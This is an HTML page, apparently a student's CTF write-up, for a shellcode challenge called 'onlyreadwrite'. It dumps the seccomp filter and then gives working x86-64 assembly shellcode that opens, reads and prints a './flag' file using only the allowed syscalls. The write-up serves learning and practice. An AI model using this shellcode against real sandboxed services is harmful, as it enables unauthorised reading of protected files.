@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>onlyreadwrite - Cyberchallenge Writeups</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <link href="../../css/custom-styles.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "onlyreadwrite", url: "#_top", children: [
+              {title: "What syscalls can we use?", url: "#what-syscalls-can-we-use" },
+              {title: "The shellcode", url: "#the-shellcode" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../gimme3bytes/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../gimme3bytes/" class="btn btn-xs btn-link">
+        gimme3bytes
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../backtoshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../backtoshell/" class="btn btn-xs btn-link">
+        backtoshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="onlyreadwrite">onlyreadwrite</h1>
+<p>This challenge reads shellcode from stdin and executes it. The problem is that the syscalls that we can use are limited.</p>
+<h2 id="what-syscalls-can-we-use">What syscalls can we use?</h2>
+<p>To find out what syscalls we can use there is the following command:</p>
+<pre><code class="language-bash">seccomp-tools dump ./onlyreadwrite
+</code></pre>
+<p>Some details about the tool can be found <a href="https://github.com/david942j/seccomp-tools">here</a>.</p>
+<p>The output of the command is the following:</p>
+<pre><code class="language-bash"> line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre>
+<p>Then only open, read and write are allowed (and some other syscalls that we don't need).</p>
+<h2 id="the-shellcode">The shellcode</h2>
+<p>Now that we know that we can use just a few syscalls, we can start writing the shellcode.</p>
+<p>The idea was to use shellcraft to generate the shellcode for the open-read-write sequence.</p>
+<pre><code class="language-python">shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0)
+shellcode += pwnlib.shellcraft.amd64.linux.read(FD_READ, 'rsp', 100)
+shellcode += pwnlib.shellcraft.amd64.linux.write(FD_WRITE = 1, 'rsp', 100)
+</code></pre>
+<p>The problem is that (afaik) there is no way to get the file descriptor from the open syscall and use it as argument for the read.</p>
+<p>So i generated the assembly from shellcraft and slightly modified it to get the file descriptor in RDI (where the read syscall expects it).</p>
+<pre><code class="language-c">; push './flag' on the stack
+mov rax, 0x101010101010101
+push rax
+mov rax, 0x101010101010101 ^ 0x67616c662f2e
+xor [rsp], rax
+
+; call open(RDI -&gt; './flag', 0, 0)
+mov rdi, rsp
+xor edx, edx /* 0 */
+xor esi, esi /* 0 */
+push SYS_open /* 2 */
+pop rax /* -&gt; 2 */
+syscall
+
+; call read(RDI -&gt; RAX = fd of './flag', RSI = 'rsp', RDX = 0x64)
+push rax
+xor eax, eax /* SYS_read */
+pop rdi ; -&gt; fd  returned by open
+push 0x64
+pop rdx
+mov rsi, rsp
+syscall
+
+; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64)
+push 1
+pop rdi
+push 0x64
+pop rdx
+mov rsi, rsp
+push SYS_write ; 1
+pop rax
+syscall
+</code></pre>
+<p>Basically it is opening the file, reading it on the stack and then writing it on stdout.</p>
+<p>The complete exploit is in <a href="script.py">script.py</a>.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../gimme3bytes/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../gimme3bytes/" class="btn btn-xs btn-link">
+        gimme3bytes
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../backtoshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../backtoshell/" class="btn btn-xs btn-link">
+        backtoshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/gio-del/ODC-Challenges-CTF/edit/main/shellcode/onlyreadwrite/README.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gio-del/ODC-Challenges-CTF">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
